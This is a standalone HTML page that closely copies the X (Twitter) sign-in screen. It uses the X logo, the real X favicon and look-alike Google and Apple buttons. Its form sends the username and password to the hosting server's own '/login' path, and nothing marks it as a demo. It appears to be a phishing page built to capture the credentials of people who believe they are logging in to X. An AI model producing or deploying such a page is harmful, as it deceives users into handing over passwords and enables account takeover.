<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Log in to X</title>
<link rel="icon" href="https://abs.twimg.com/favicons/twitter.3.ico">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#000;color:#e7e9ea;display:flex;align-items:center;justify-content:center;min-height:100vh}
.container{display:flex;align-items:center;justify-content:center;width:100%;max-width:1200px;padding:20px;gap:60px}
.left{flex:1;display:flex;align-items:center;justify-content:center}
.left svg{width:380px;height:380px;fill:#e7e9ea}
.right{width:364px;padding:20px 0}
.logo{margin-bottom:32px}
.logo svg{width:40px;height:40px;fill:#e7e9ea}
h1{font-size:31px;font-weight:700;margin-bottom:32px;color:#e7e9ea}
.btn-google{width:100%;padding:12px;background:white;color:#0f1419;border:none;border-radius:20px;font-size:15px;font-weight:500;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:12px}
.btn-google:hover{background:#e7e9ea}
.btn-google img{width:20px;height:20px}
.btn-apple{width:100%;padding:12px;background:white;color:#0f1419;border:none;border-radius:20px;font-size:15px;font-weight:500;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:20px}
.btn-apple:hover{background:#e7e9ea}
.divider{display:flex;align-items:center;margin-bottom:20px}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#2f3336}
.divider span{padding:0 12px;color:#71767b;font-size:14px}
.input-group{position:relative;margin-bottom:20px}
.input-group input{width:100%;padding:16px 12px 8px;background:#000;border:1px solid #333639;border-radius:4px;color:#e7e9ea;font-size:17px;outline:none}
.input-group input:focus{border-color:#1d9bf0;box-shadow:0 0 0 1px #1d9bf0}
.input-group label{position:absolute;left:12px;top:50%;transform:translateY(-50%);color:#71767b;font-size:17px;pointer-events:none;transition:all 0.2s}
.input-group input:focus+label,.input-group input:not(:placeholder-shown)+label{top:10px;font-size:12px;color:#1d9bf0}
.forgot{color:#1d9bf0;font-size:14px;text-decoration:none;display:block;margin-bottom:24px}
.forgot:hover{text-decoration:underline}
.login-btn{width:100%;padding:12px;background:#eff3f4;color:#0f1419;border:none;border-radius:20px;font-size:17px;font-weight:700;cursor:pointer}
.login-btn:hover{background:#d7dbdc}
.signup{margin-top:40px;font-size:17px;color:#71767b}
.signup a{color:#1d9bf0;text-decoration:none}
.signup a:hover{text-decoration:underline}
@media(max-width:768px){.container{flex-direction:column;gap:20px}.left svg{width:120px;height:120px}.right{width:100%;max-width:364px}}
</style>
</head>
<body>
<div class="container">
    <div class="left">
        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
        </svg>
    </div>
    <div class="right">
        <h1>Sign in to X</h1>
        <button class="btn-google">
            <svg width="20" height="20" viewBox="0 0 48 48"><path fill="#FFC107" d="M43.611 20.083H42V20H24v8h11.303c-1.649 4.657-6.08 8-11.303 8-6.627 0-12-5.373-12-12s5.373-12 12-12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4 12.955 4 4 12.955 4 24s8.955 20 20 20 20-8.955 20-20c0-1.341-.138-2.65-.389-3.917z"/><path fill="#FF3D00" d="m6.306 14.691 6.571 4.819C14.655 15.108 18.961 12 24 12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4 16.318 4 9.656 8.337 6.306 14.691z"/><path fill="#4CAF50" d="M24 44c5.166 0 9.86-1.977 13.409-5.192l-6.19-5.238A11.91 11.91 0 0 1 24 36c-5.202 0-9.619-3.317-11.283-7.946l-6.522 5.025C9.505 39.556 16.227 44 24 44z"/><path fill="#1976D2" d="M43.611 20.083H42V20H24v8h11.303a12.04 12.04 0 0 1-4.087 5.571l.003-.002 6.19 5.238C36.971 39.205 44 34 44 24c0-1.341-.138-2.65-.389-3.917z"/></svg>
            Sign in with Google
        </button>
        <button class="btn-apple">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="#000"><path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/></svg>
            Sign in with Apple
        </button>
        <div class="divider"><span>or</span></div>
        <form action="/login" method="POST">
            <div class="input-group">
                <input type="text" name="email" id="email" placeholder=" " required>
                <label for="email">Phone, email, or username</label>
            </div>
            <div class="input-group">
                <input type="password" name="password" id="password" placeholder=" " required>
                <label for="password">Password</label>
            </div>
            <a href="#" class="forgot">Forgot password?</a>
            <button type="submit" class="login-btn">Sign in</button>
        </form>
        <p class="signup">Don't have an account? <a href="#">Sign up</a></p>
    </div>
</div>
</body>
</html>
